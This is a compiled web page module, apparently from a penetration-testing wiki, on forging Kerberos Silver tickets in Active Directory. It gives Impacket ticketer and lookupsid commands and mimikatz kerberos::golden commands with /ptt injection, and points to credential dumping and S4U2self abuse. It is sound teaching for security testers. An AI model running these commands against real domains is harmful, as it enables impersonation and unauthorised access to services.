import{_ as k,c as o,a5 as r,G as t,w as a,B as l,o as d,j as i,a as s}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"Silver tickets","description":"","frontmatter":{"authors":"ShutdownRepo, mauricelambert, sckdev"},"headers":[],"relativePath":"ad/movement/kerberos/forged-tickets/silver.md","filePath":"ad/movement/kerberos/forged-tickets/silver.md","lastUpdated":1724982529000}'),p={name:"ad/movement/kerberos/forged-tickets/silver.md"};function c(g,e,F,E,y,u){const h=l("PluginTabsTab"),n=l("PluginTabs");return d(),o("div",null,[e[2]||(e[2]=r('<h1 id="silver-tickets" tabindex="-1">Silver tickets <a class="header-anchor" href="#silver-tickets" aria-label="Permalink to &quot;Silver tickets&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>The long-term key of a service account can be used to forge a Service ticket that can later be used with <a href="./../ptt">Pass-the-ticket</a> to access that service. In a Silver Ticket scenario, an attacker will forge a Service Ticket containing a PAC that features arbitrary information about the requesting user, effectively granting lots of access.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><div class="important custom-block"><p>When forging tickets, before November 2021 updates, the <code>user-id</code> and <code>groups-ids</code> were useful but the <code>username</code> supplied was mostly useless. As of Nov. 2021 updates, if the <code>username</code> supplied doesn&#39;t exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.</p></div><p>In order to craft a silver ticket, testers need to find the target service account&#39;s RC4 key (i.e. NT hash) or AES key (128 or 256 bits). This can be done by <a href="./../../ntlm/capture">capturing an NTLM response</a> (preferably NTLMv1) and <a href="./../../credentials/cracking">cracking</a> it, by <a href="./../../credentials/dumping/sam-and-lsa-secrets">dumping LSA secrets</a>, by doing a <a href="./../../credentials/dumping/dcsync">DCSync</a>, etc.</p><p><em>&quot;While the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a DC when using them, so detection is more difficult than Golden Tickets.&quot; (</em><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noreferrer"><em>adsecurity.org</em></a><em>)</em></p>',7)),t(n,null,{default:a(()=>[t(h,{label:"UNIX-like"},{default:a(()=>e[0]||(e[0]=[i("p",null,[s("The "),i("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s(" script "),i("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py",target:"_blank",rel:"noreferrer"},"ticketer"),s(" can create silver tickets.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find the domain SID")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lookupsid.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/DomainUser@DomainController'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 0")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an NT hash")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"python"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ticketer.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -nthash"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$NT_HASH"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain-sid"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainSID"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$SPN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "username"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES (128 or 256 bits) key")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"python"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ticketer.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -aesKey"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$AESkey"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain-sid"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainSID"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$SPN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "username"')])])])],-1),i("p",null,[s("The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, "),i("code",null,"cifs/target.domain"),s(" or "),i("code",null,"host/target.domain"),s(" will allow most remote dumping operations (more info on "),i("a",{href:"https://adsecurity.org/?page_id=183",target:"_blank",rel:"noreferrer"},"adsecurity.org"),s(").")],-1)])),_:1}),t(h,{label:"Windows"},{default:a(()=>e[1]||(e[1]=[i("p",null,[s("On Windows, "),i("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"mimikatz"),s(" can be used to generate a silver ticket with "),i("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden",target:"_blank",rel:"noreferrer"},[i("code",null,"kerberos::golden")]),s(". Testers need to carefully choose the right SPN type (cifs, http, ldap, host, rpcss) depending on the wanted usage.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an NT hash")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"kerberos::golden"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /domain:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/sid:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainSID "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/rc4:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$serviceAccount_NThash "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/user:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$username_to_impersonate "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/target:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$targetFQDN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/service:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$spn_type "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/ptt")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES 128 key")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"kerberos::golden"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /domain:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/sid:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainSID "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/aes128:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$serviceAccount_aes128_key "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/user:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$username_to_impersonate "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/target:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$targetFQDN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/service:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$spn_type "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/ptt")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES 256 key")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"kerberos::golden"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /domain:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/sid:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainSID "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/aes256:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$serviceAccount_aes256_key "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/user:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$username_to_impersonate "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/target:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$targetFQDN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/service:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$spn_type "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/ptt")])])])],-1),i("p",null,[s("For both mimikatz and Rubeus, the "),i("code",null,"/ptt"),s(" flag is used to automatically "),i("a",{href:"./../ptt#injecting-the-ticket"},"inject the ticket"),s(".")],-1)])),_:1})]),_:1}),e[3]||(e[3]=r('<div class="success custom-block"><p>A great, stealthier, alternative to silver ticket is to <a href="./../delegations/s4u2self-abuse">abuse S4U2self</a> in order to impersonate a domain user with local admin privileges on the target machine by relying on Kerberos delegation instead of forging everything.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://en.hackndo.com/kerberos-silver-golden-tickets/" target="_blank" rel="noreferrer">https://en.hackndo.com/kerberos-silver-golden-tickets/</a></p><p><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noreferrer">https://adsecurity.org/?p=2011</a></p>',4))])}const b=k(p,[["render",c]]);export{C as __pageData,b as default};